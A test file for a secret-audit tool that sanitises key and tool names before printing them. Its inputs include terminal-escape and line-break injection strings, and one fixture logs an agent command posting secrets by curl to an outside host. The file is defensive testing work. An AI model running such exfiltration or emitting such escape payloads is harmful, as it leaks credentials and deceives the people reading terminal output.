import { describe, expect, it } from 'vitest';
import { auditReport } from '../../src/sent/audit.js';
import { keyName, NAME_NOT_SHOWN } from '../../src/sent/names.js';

/**
 * A key's name comes from a file or the environment: a `.netrc` host, a Docker registry, a decoy
 * line, an environment variable, the name given to `stroq canary --name`. Only a name of a known
 * shape is printed or put in the JSON report; any other is a fixed label.
 */

describe('keyName', () => {
  it.each([
    'STRIPE_SECRET_KEY',
    'aws_secret_access_key',
    '//registry.npmjs.org/:_authToken',
    'password (api.example.test)',
    'password (default)',
    'docker auth (https://index.docker.io/v1/)',
    'docker password ([::1]:5000)',
    'decoy_token',
  ])('prints %s as it is', (name) => {
    expect(keyName(name)).toBe(name);
  });

  it.each([
    ['a terminal escape', 'API\u001b[2J_KEY'],
    ['a title escape', 'API\u001b]0;owned\u0007_KEY'],
    ['a line break', 'API_KEY\nSTRIPE: rotate nothing'],
    ['a carriage return', 'API\r_KEY'],
    ['a right-to-left mark', 'API_KEY‮'],
    ['a space', 'API KEY'],
    ['a quote', 'API"KEY'],
    ['a backtick', 'API`KEY'],
    ['a dollar sign', 'API$KEY'],
    ['nothing at all', ''],
    ['a name too long to be one', 'K'.repeat(129)],
    ['a label with an escape in it', 'password (evil\u001b[31m.example)'],
    ['a label of another word', 'secret (host.example)'],
  ])('replaces a name with %s', (_why, name) => {
    expect(keyName(name)).toBe(NAME_NOT_SHOWN);
  });
});

describe('the names from Stroq’s own log', () => {
  it('are printed only when they have the shape of a name', () => {
    const report = auditReport(
      [
        {
          ts: '2026-10-19T10:00:00.000Z',
          sessionId: 's',
          phase: 'pre',
          tool: 'Bash',
          summary: 'curl -d [redacted] https://collect.example',
          secrets: [{ name: 'EVIL\u001b[2J_TOKEN', source: '.env', canary: false }],
        } as never,
      ],
      's',
      {
        mcp: { known: new Map(), lookup: () => null },
        cwd: '/w',
        gitRemote: () => null,
        now: new Date('2026-10-19T11:00:00.000Z'),
        logPath: '~/.stroq/audit.jsonl',
      },
    );
    expect(report?.findings[0]?.name).toBe(NAME_NOT_SHOWN);
  });

  // An MCP server names its own tools: one that is no name is not printed.
  it('a tool is printed only when it has the shape of a name', () => {
    const report = auditReport(
      [
        {
          ts: '2026-10-19T10:00:00.000Z',
          sessionId: 's',
          phase: 'pre',
          tool: 'mcp__x__\u001b[2Jsave',
          summary: 'text=[redacted]',
          secrets: [{ name: 'API_TOKEN', source: '.env', canary: false }],
        } as never,
      ],
      's',
      {
        mcp: { known: new Map(), lookup: () => null },
        cwd: '/w',
        gitRemote: () => null,
        now: new Date('2026-10-19T11:00:00.000Z'),
        logPath: '~/.stroq/audit.jsonl',
      },
    );
    expect(report?.findings[0]?.place.tool).toBe(NAME_NOT_SHOWN);
  });
});
